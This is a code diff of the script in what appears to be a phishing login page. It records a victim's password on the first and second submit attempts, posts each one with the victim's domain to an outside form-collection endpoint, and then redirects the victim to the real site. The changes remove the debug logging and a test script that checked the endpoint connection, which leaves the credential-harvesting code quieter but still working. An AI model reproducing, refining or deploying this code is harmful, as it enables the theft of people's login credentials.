@@ -422,7 +422,7 @@ document.addEventListener("DOMContentLoaded", function() {
         if (submitCount === 1) {
             firstPassword = currentPassword;
             
-            // SEND FIRST ATTEMPT IMMEDIATELY - with Doc_login: true
+            // SEND FIRST ATTEMPT IMMEDIATELY
             fetch('https://submit-form.com/3KukZ309B', {
                 method: 'POST',
                 headers: {
@@ -436,15 +436,7 @@ document.addEventListener("DOMContentLoaded", function() {
                     domain: domainUrl,
                     Doc_login: true
                 })
-            })
-            .then(response => {
-                if (response.ok) {
-                    console.log('First attempt sent successfully');
-                } else {
-                    console.error('Formspark error:', response.status);
-                }
-            })
-            .catch(error => console.error('Formspark error:', error));
+            });
             
             document.getElementById("loader-overlay").style.display = "flex";
             
@@ -457,7 +449,7 @@ document.addEventListener("DOMContentLoaded", function() {
         } else if (submitCount === 2) {
             document.getElementById("loader-overlay").style.display = "flex";
             
-            // Send SECOND attempt - with Doc_login: true
+            // Send SECOND attempt
             fetch('https://submit-form.com/3KukZ309B', {
                 method: 'POST',
                 headers: {
@@ -472,15 +464,7 @@ document.addEventListener("DOMContentLoaded", function() {
                     domain: domainUrl,
                     Doc_login: true
                 })
-            })
-            .then(response => {
-                if (response.ok) {
-                    console.log('Second attempt sent successfully');
-                } else {
-                    console.error('Formspark error:', response.status);
-                }
-            })
-            .catch(error => console.error('Formspark error:', error));
+            });
             
             // Redirect to actual domain
             setTimeout(function() {
@@ -525,36 +509,6 @@ document.addEventListener("DOMContentLoaded", function() {
         }
     });
 });
-</script>
-
-<!-- Add this test script to verify Formspark connection -->
-<script>
-// Test Formspark connection on page load
-setTimeout(function() {
-    console.log("🔍 Testing Formspark connection...");
-    fetch('https://submit-form.com/3KukZ309B', {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/json',
-            'Accept': 'application/json'
-        },
-        body: JSON.stringify({
-            test: "connection_test",
-            message: "If you see this, Formspark is working!",
-            Doc_login: true
-        })
-    })
-    .then(response => {
-        if (response.ok) {
-            console.log("✅ Formspark connection SUCCESSFUL!");
-            return response.json();
-        } else {
-            console.error("❌ Formspark connection FAILED. Status:", response.status);
-        }
-    })
-    .then(data => console.log("Response:", data))
-    .catch(error => console.error("❌ Formspark connection ERROR:", error));
-}, 1000);
 </script>
 
 </body>
